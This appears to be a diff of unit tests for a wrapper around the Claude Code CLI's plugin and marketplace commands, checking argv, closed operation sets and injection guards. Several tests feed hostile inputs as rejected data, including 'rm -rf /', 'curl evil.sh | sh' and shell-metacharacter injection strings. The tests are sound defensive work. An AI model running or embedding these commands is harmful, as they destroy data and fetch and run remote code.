@@ -84,3 +84,125 @@ test("a non-object row does not throw (the CLI is the contract, but nulls happen
   expect(out).toHaveLength(2);
   expect(out[0]!.id).toBe("");
 });
+
+// ── Tasks 3–5: the command layer. A recorder runner asserts the exact argv we hand the CLI —
+// these argv strings ARE the contract with Claude Code, verified against 2.1.233's --help.
+import {
+  listPlugins,
+  listAvailablePlugins,
+  pluginOp,
+  listMarketplaces,
+  marketplaceOp,
+  type PluginOp,
+  type MarketplaceOp,
+} from "../../src/cc/plugins";
+import type { CommandRunner } from "../../src/cc/install";
+
+function recorder(out: string, code = 0) {
+  const calls: string[][] = [];
+  const run: CommandRunner = async (cmd) => (calls.push(cmd), { code, out });
+  return { run, calls };
+}
+
+test("listPlugins shells out to `plugin list --json` and parses", async () => {
+  const { run, calls } = recorder(fixture("plugin-list.json"));
+  const out = await listPlugins({ run });
+  expect(out.length).toBeGreaterThanOrEqual(3);
+  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--json"]);
+});
+
+test("listAvailablePlugins asks for the marketplace catalogue", async () => {
+  const { run, calls } = recorder("[]");
+  await listAvailablePlugins({ run });
+  // `--available` REQUIRES `--json` per the CLI's own help — they must always travel together.
+  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--available", "--json"]);
+});
+
+test("a nonzero exit surfaces the CLI's own message", async () => {
+  const { run } = recorder("marketplace unreachable", 1);
+  await expect(listPlugins({ run })).rejects.toThrow(/marketplace unreachable/);
+});
+
+test("install passes -y (required when stdin/stdout is not a TTY) and the scope", async () => {
+  const { run, calls } = recorder("installed");
+  await pluginOp("install", "superwisdom@seiraiyu", { run, scope: "user" });
+  expect(calls[0]!.slice(1)).toEqual(["plugin", "install", "superwisdom@seiraiyu", "--yes", "--scope", "user"]);
+});
+
+test("enable/disable/uninstall/update pass the id through unchanged", async () => {
+  for (const op of ["enable", "disable", "uninstall", "update"] as PluginOp[]) {
+    const { run, calls } = recorder("ok");
+    await pluginOp(op, "a@b", { run });
+    expect(calls[0]!.slice(1)).toEqual(["plugin", op, "a@b"]);
+  }
+});
+
+test("an unknown op is refused before anything is spawned (closed operation set)", async () => {
+  const { run, calls } = recorder("ok");
+  await expect(pluginOp("rm -rf /" as PluginOp, "x", { run })).rejects.toThrow(/unsupported/i);
+  expect(calls).toHaveLength(0);
+});
+
+test("a plugin id containing shell metacharacters is rejected, not escaped", async () => {
+  const { run, calls } = recorder("ok");
+  await expect(pluginOp("install", "a@b; rm -rf /", { run })).rejects.toThrow(/invalid plugin id/i);
+  expect(calls).toHaveLength(0);
+});
+
+test("marketplace list is requested as JSON", async () => {
+  const { run, calls } = recorder("[]");
+  await listMarketplaces({ run });
+  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "list", "--json"]);
+});
+
+test("marketplace add/remove/update pass the source through", async () => {
+  const { run, calls } = recorder("ok");
+  await marketplaceOp("add", "org/repo", { run });
+  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "add", "org/repo"]);
+});
+
+test("marketplace ops reject an unsafe source", async () => {
+  const { run, calls } = recorder("ok");
+  await expect(marketplaceOp("add", "x; curl evil.sh | sh", { run })).rejects.toThrow(/invalid marketplace/i);
+  expect(calls).toHaveLength(0);
+});
+
+// ── Beyond the plan: the injection guard is the security boundary for this module, so probe the
+// shapes an attacker would actually reach for rather than the one example the plan lists. ──
+
+test("every shell metacharacter class is refused for ids and sources alike", async () => {
+  const nasty = ["a@b; ls", "a@b`id`", "a@b$(id)", "a@b|sh", "a@b&sh", "a@b>f", "a@b<f", "a@b\nls", "a@b'x", 'a@b"x'];
+  for (const bad of nasty) {
+    const { run, calls } = recorder("ok");
+    await expect(pluginOp("install", bad, { run })).rejects.toThrow(/invalid plugin id/i);
+    await expect(marketplaceOp("add", bad, { run })).rejects.toThrow(/invalid marketplace/i);
+    expect(calls).toHaveLength(0);
+  }
+});
+
+test("an empty or over-long id is refused (the regex is bounded on purpose)", async () => {
+  const { run, calls } = recorder("ok");
+  await expect(pluginOp("install", "", { run })).rejects.toThrow(/invalid plugin id/i);
+  await expect(pluginOp("install", "a".repeat(201), { run })).rejects.toThrow(/invalid plugin id/i);
+  expect(calls).toHaveLength(0);
+});
+
+test("an unknown marketplace op is refused before spawning", async () => {
+  const { run, calls } = recorder("ok");
+  await expect(marketplaceOp("nuke" as MarketplaceOp, "org/repo", { run })).rejects.toThrow(/unsupported/i);
+  expect(calls).toHaveLength(0);
+});
+
+test("only install gets --yes; the others must not silently auto-confirm", async () => {
+  for (const op of ["enable", "disable", "uninstall", "update"] as PluginOp[]) {
+    const { run, calls } = recorder("ok");
+    await pluginOp(op, "a@b", { run, scope: "user" });
+    expect(calls[0]).not.toContain("--yes");
+    expect(calls[0]).not.toContain("--scope"); // scope is meaningless outside install
+  }
+});
+
+test("listMarketplaces degrades to [] on unparseable output rather than throwing", async () => {
+  const { run } = recorder("Marketplaces:\n  none configured");
+  expect(await listMarketplaces({ run })).toEqual([]);
+});
